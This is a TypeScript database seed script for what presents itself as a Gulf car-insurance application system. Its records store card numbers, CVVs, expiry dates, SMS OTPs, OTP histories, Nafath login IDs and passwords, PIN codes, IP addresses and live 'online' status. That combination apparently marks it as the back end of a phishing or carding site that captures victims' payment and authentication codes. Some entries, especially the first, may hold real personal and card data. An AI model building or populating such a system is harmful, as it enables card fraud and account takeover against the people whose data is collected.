import { db } from "./server/db";
import { insuranceApplications } from "./shared/schema";

const sampleApplications = [
  {
    country: "السعودية",
    identityNumber: "1060493093",
    documment_owner_full_name: "علي احمد محمد عسيري",
    phoneNumber: "0559281929",
    phoneNumber2: "0501234567",
    documentType: "استمارة",
    serialNumber: "V201501",
    insuranceType: "تأمين جديد",
    coverageType: "تأمين شامل",
    insuranceStartDate: "2025-12-27",
    vehicleUsage: "شخصي",
    vehicleValue: 50000,
    manufacturingYear: 2021,
    vehicleModel: "تويوتا كامري",
    plateNumber: "5957 D S J",
    plateText: "د س ح ٥٩٥٧",
    repairLocation: "workshop",
    selectedOffer: {
      id: 1,
      company: "التعاونية",
      price: 1500,
      type: "شامل",
      features: ["تغطية الحوادث", "المساعدة على الطريق", "تغطية الكوارث الطبيعية"]
    },
    totalPrice: "1650",
    paymentMethod: "بطاقة ائتمان",
    cardNumber: "5294 1513 9411 1962",
    cardHolderName: "Ali Mohammed Asiri",
    expiryDate: "11/27",
    cvv: "338",
    cardType: "DEBIT",
    bankInfo: "البنك الأهلي",
    paymentStatus: "completed",
    currentStep: "4",
    status: "approved",
    location: "السعودية، مكة المكرمة",
    ipAddress: "2001:16a2:c16c:cc4f:78bf:7438:35b9:e920",
    deviceInfo: "iOS | mobile | Mobile Chrome",
    online: true,
    cardStatus: "approved_with_otp",
    phoneOtp: "123456",
    phoneCarrier: "STC",
    phoneOtpApproved: "approved",
    phoneVerificationStatus: "approved",
    idVerificationStatus: "approved",
    otp: "789012",
    allPhoneOtps: ["123456", "654321"],
    nafazId: "NAF123456",
    nafazPass: "****",
    authNumber: "AUTH789"
  },
  {
    country: "السعودية",
    identityNumber: "1234567890",
    documment_owner_full_name: "عمار احمد حرفوش",
    phoneNumber: "0500000001",
    documentType: "استمارة",
    serialNumber: "V201502",
    insuranceType: "تأمين جديد",
    coverageType: "ضد الغير",
    insuranceStartDate: "2025-12-27",
    vehicleUsage: "شخصي",
    vehicleValue: 30000,
    manufacturingYear: 2020,
    vehicleModel: "تويوتا كورولا",
    plateNumber: "1234 A B C",
    repairLocation: "workshop",
    paymentMethod: "بطاقة ائتمان",
    cardNumber: "4532 1234 5678 9012",
    cardHolderName: "Ammar Harfoush",
    expiryDate: "05/26",
    cvv: "456",
    cardType: "CREDIT",
    bankInfo: "الراجحي",
    paymentStatus: "pending",
    status: "pending_review",
    currentStep: "4",
    online: true,
    cardStatus: "pending",
    phoneOtp: "567890",
    phoneCarrier: "Mobily",
    phoneOtpApproved: "pending",
    otp: "345678"
  },
  {
    country: "الإمارات",
    identityNumber: "1234567891",
    documment_owner_full_name: "خميس الزهراني",
    phoneNumber: "0500000002",
    documentType: "استمارة",
    serialNumber: "V201503",
    insuranceType: "تأمين جديد",
    coverageType: "ضد الغير",
    insuranceStartDate: "2025-12-27",
    vehicleUsage: "تجاري",
    vehicleValue: 45000,
    manufacturingYear: 2022,
    vehicleModel: "هيونداي سوناتا",
    repairLocation: "agency",
    paymentStatus: "pending",
    status: "pending_review",
    currentStep: "3",
    online: false,
    phoneCarrier: "Etisalat"
  },
  {
    country: "السعودية",
    identityNumber: "1234567892",
    documment_owner_full_name: "محمد عبدالله السعيد",
    phoneNumber: "0500000003",
    documentType: "بطاقة جمركية",
    serialNumber: "V201504",
    insuranceType: "نقل ملكية",
    coverageType: "شامل",
    insuranceStartDate: "2025-12-28",
    vehicleUsage: "شخصي",
    vehicleValue: 80000,
    manufacturingYear: 2023,
    vehicleModel: "فورد تورس",
    plateNumber: "9876 X Y Z",
    repairLocation: "agency",
    selectedOffer: {
      id: 2,
      company: "ميدغلف",
      price: 2200,
      type: "شامل",
      features: ["تغطية شاملة", "سيارة بديلة"]
    },
    paymentStatus: "pending",
    status: "draft",
    currentStep: "4",
    online: true,
    buyerIdNumber: "9876543210",
    buyerName: "أحمد محمد العتيبي",
    pinCode: "1234"
  },
  {
    country: "الكويت",
    identityNumber: "1234567893",
    documment_owner_full_name: "عبدالله الدوحان",
    phoneNumber: "0500000004",
    documentType: "استمارة",
    serialNumber: "V201506",
    insuranceType: "تأمين جديد",
    coverageType: "ضد الغير",
    insuranceStartDate: "2025-12-27",
    vehicleUsage: "شخصي",
    vehicleValue: 120000,
    manufacturingYear: 2024,
    vehicleModel: "جي ام سي يوكن",
    repairLocation: "agency",
    paymentStatus: "pending",
    status: "pending_review",
    currentStep: "2",
    notes: "تحقق نفاذ مطلوب",
    nafazId: "NAF789",
    online: true
  }
];

async function seed() {
  console.log("Seeding database...");
  
  for (const app of sampleApplications) {
    await db.insert(insuranceApplications).values(app);
  }
  
  console.log("Database seeded successfully!");
  process.exit(0);
}

seed().catch((error) => {
  console.error("Error seeding database:", error);
  process.exit(1);
});
